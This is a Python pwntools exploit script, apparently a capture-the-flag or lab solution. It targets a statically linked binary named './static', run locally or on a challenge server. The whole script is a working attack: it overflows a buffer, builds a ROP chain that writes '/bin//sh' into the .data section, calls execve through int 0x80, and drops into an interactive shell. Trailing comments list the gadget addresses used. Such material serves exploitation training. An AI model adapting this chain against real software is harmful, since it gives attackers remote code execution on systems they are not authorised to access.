from pwn import *

PROG_NAME = "./static"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6002

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

payload = b'A'*0x10
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x6e69622f) # /bin
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da060) #.data
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x68732f2f) # //sh
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da064) #.data+0x4
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x00000000) #null
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da068) #.data+0x8
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x08056114) #pop eax; pop edx; pop ebx; ret;
payload += p32(0x0000000b) #syscall number 0xb
payload += p32(0x00000000) #null
payload += p32(0x080da060) #.data
payload += p32(0x0806ef51) #xor ecx, ecx; int 0x80;

p.sendline(payload)

p.interactive()

'''
0x080da060	.data

0x080c3f5b  /b
0x080c4373  in
0x080ac3fc  /sh

0x0805b67e: pop ebx; pop edi; ret;
0x08056114: pop eax; pop edx; pop ebx; ret;
0x0806ef51: xor ecx, ecx; int 0x80;

0x0809ceb4: mov dword ptr [eax], edx; ret; 
p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
p32(0x08064564) #mov eax, edx; ret; 
p32(0x0806eb8b) #pop edx; ret; 
0x080a8cb6: pop eax; ret; # 0a is newline so it will break fgets(). big sad :((

'''

